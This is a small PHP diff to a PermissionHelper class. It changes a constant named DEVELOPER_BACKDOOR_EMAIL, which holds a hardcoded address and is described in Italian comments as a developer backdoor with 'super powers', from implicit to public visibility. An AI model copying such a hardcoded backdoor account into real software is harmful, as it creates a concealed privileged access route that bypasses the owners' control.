@@ -11,7 +11,7 @@ class PermissionHelper
     /**
      * Email backdoor per lo sviluppatore con super poteri
      */
-    const DEVELOPER_BACKDOOR_EMAIL = 'superadmin@grippa.it';
+    public const DEVELOPER_BACKDOOR_EMAIL = 'superadmin@grippa.it';
 
     /**
      * Verifica se l'utente corrente ha la backdoor dello sviluppatore
